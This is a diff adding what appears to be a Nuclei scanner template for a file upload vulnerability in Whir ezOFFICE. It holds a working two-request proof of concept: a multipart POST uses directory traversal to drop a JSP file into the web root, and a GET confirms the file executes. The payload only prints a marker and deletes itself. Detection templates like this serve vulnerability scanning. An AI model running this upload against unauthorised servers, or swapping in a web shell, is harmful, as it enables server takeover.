@@ -1,0 +1,53 @@
+id: whir-ezoffice-wpsservlet-file-upload
+info:
+  name: Whir ezOFFICE wpsservlet File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Whir Network ezOFFICE is an OA office automation system. This vulnerability allows attackers to upload malicious files, gain server permissions, and perform malicious operations.
+  tags: file-upload
+  classification:
+    cvss-score: 9.8
+
+variables:
+  filename: "test.jsp"
+  content: "<% out.println(\"ByTestZsf323408hfj0486\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/defaultroot/wpsservlet?option=saveNewFile&newdocId=test&dir=../platform/portal/layout/&fileType=.jsp"
+    headers:
+      Cache-Control: max-age=0
+      Content-Type: multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6
+    body: |
+      --803e058d60f347f7b3c17fa95228eca6\r\n
+      Content-Disposition: form-data; name="NewFile"; filename="{{filename}}"\r\n\r\n
+      {{content}}\r\n--803e058d60f347f7b3c17fa95228eca6--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-Length: 0"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/defaultroot/platform/portal/layout/{{filename}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ByTestZsf323408hfj0486"
